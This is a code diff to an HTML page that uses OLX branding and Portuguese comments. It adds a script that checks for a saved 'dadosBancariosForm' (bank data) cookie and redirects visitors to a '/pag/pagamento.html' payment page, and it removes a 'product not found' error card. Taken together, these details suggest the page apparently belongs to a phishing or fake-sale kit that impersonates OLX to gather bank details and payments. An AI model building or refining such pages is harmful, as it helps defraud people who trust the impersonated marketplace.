@@ -9,6 +9,31 @@
     <link rel="stylesheet" href="/css/style.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <link rel="shortcut icon" href="/images/olx-favicon.ico" type="image/x-icon">
+    <script>
+        // Redireciona para pagamento se já tiver dados bancários salvos
+        (function () {
+            function getCookie(name) {
+                const nameEQ = name + "=";
+                const ca = document.cookie.split(";");
+                for (let i = 0; i < ca.length; i++) {
+                    let c = ca[i];
+                    while (c.charAt(0) === " ") c = c.substring(1, c.length);
+                    if (c.indexOf(nameEQ) === 0) return decodeURIComponent(c.substring(nameEQ.length, c.length));
+                }
+                return null;
+            }
+            if (getCookie("dadosBancariosForm")) {
+                // Tenta pegar o parâmetro id da URL
+                const params = new URLSearchParams(window.location.search);
+                const id = params.get("id");
+                if (id) {
+                    window.location.href = "/pag/pagamento.html?id=" + encodeURIComponent(id);
+                } else {
+                    window.location.href = "/pag/pagamento.html";
+                }
+            }
+        })();
+    </script>
 </head>
 
 <body>
@@ -163,16 +188,6 @@
                 </div>
             </div>
         </main>
-
-        <div id="erro-container" class="erro-container hidden">
-            <div class="card">
-                <h2>Produto não encontrado</h2>
-                <p>Não foi possível encontrar o produto com o código informado.</p>
-                <button class="btn-voltar">Voltar para a página inicial</button>
-            </div>
-        </div>
-
-
 
         <!-- Removido: seção de detalhes da transação com resumo e cronograma -->
 
